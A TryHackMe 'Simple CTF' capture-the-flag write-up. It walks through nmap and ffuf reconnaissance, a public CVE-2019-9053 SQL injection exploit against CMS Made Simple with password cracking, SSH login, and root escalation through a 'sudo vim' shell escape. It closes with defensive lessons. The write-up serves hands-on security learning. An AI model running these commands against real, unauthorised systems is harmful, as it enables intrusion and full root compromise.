Simple-ctf (Tryhackme)

## Eumeration

1 : nmap scan
    
    -> nmap -sC -sV -A 10.x.x.x
    -> open ports 2
     - 80 = http
     - 2222 = ssh
    -> OS = Linux(ubuntu)


2 : ffuf
     
    ->command: ffuf -w /home/haxxx/SecLists/Discovery/Web-Content/common.txt -u http://X0.X8.1X1.1X2/FUZZ
    -> the hidden directorys are:
    -> /simple

## Initial Access

There is a cms-made-simple cms-website is running on port 80 /simple hidden directry
if we serearch a vulnerabitlity for cms-made-simple in exploit-db then we get sqli of
CVE-2019-9053 where these python script is made for python2 version so run in any low linux
system or in thm attackbox

    ->python2 exploit.py -u http://10.x.x.x/simple --crack -w /home/kali/rockyou.txt

 then we get username,salt,emal and password 

now connect to ssh useing command

    ->sudo ssh mitch@10.x.x.x -p 2222
    -p(port 2222) because ssh is running on port 2222

we get initial access

## Privelege Esculation

now run sudo -l then we get output says /user/bin/vim can be run as root without password
so useing caommand

    -> sudo vim -c ':!/bin/sh -p'
    
we get root shell and root flag

## 📚 Lessons Learned

so dont use low version cms websites or better not use cms websites and make the website 
database secure so that sqli not happen and sudo misconfiguration can lead to root access so
do cross check that no file has sudo no password permesion
